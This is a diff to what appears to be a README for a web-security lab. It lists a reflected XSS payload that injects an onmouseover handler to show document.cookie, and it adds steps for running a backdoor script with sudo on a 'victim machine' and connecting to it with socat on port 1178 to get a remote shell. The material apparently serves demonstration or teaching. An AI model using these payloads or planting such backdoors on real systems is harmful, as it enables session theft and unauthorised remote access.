@@ -15,3 +15,7 @@
 2. `/index.php?text=faketitle%20onmouseover=(function(){alert(document.cookie)})();`
 3. Hover special text.
 4. For secure `/index_secure.php?text=faketitle%20onmouseover=(function(){alert(document.cookie)})();`
+
+### BACKDOOR
+1. `sudo backdoor/backdoor.sh` on victim machine
+2. `socat STDIO TCP4:<victim ip>:1178` on attacker machine
